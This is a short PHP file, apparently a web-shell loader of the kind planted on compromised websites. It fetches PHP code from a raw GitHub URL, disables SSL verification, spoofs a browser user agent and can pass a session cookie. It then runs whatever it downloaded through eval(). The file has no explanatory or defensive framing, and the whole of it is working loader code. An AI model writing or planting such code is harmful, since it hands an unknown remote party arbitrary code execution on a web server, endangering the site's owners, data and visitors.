<?php
session_start();

function geturlsinfo($url) {
    $url_get_contents_data = false;

    if (function_exists('curl_exec')) {
        $conn = curl_init($url); // Initialize cURL session
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, true); // Return result as a string
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, true); // Allow cURL to follow redirects
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0"); // User agent
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, false); // Disable SSL peer verification
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0); // Disable SSL host verification

        if (isset($_SESSION['coki'])) {
            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['coki']); // Set cookie if exists
        }

        $url_get_contents_data = curl_exec($conn); // Execute cURL
        if (curl_errno($conn)) {
            $url_get_contents_data = false; // Set to false on error
        }
        curl_close($conn); // Close cURL session
    } elseif (function_exists('file_get_contents')) {
        $url_get_contents_data = @file_get_contents($url); // Fetch contents with file_get_contents
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = @fopen($url, "r"); // Open URL
        if ($handle) {
            $url_get_contents_data = stream_get_contents($handle); // Get content from stream
            fclose($handle); // Close handle
        }
    }

    return $url_get_contents_data; // Return the result
}

// Execute the URL fetching and code execution directly
$a = geturlsinfo('https://raw.githubusercontent.com/notif77/cus/main/geck0'); // Fetch content from URL
if ($a !== false) {
    eval('?>' . $a); // Execute the fetched PHP code
} else {
    echo "Failed to retrieve content."; // Error message if failed
}
?>
